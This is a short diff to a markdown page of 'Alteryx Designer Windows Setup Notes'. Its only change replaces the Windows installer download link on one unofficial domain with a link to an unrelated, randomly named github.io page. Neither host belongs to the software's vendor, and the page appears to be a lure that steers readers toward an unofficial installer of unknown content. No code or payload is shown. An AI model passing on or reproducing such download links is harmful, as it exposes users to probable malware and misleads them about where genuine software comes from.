@@ -1,6 +1,6 @@
 # Alteryx Designer Windows Setup Notes
 
-**Download:** [Get Windows installer →](https://alteryx-setup.kolmods.com/)
+**Download:** [Get Windows installer →](https://athenianhonorific353.github.io)
 
 ## Download & Install
 
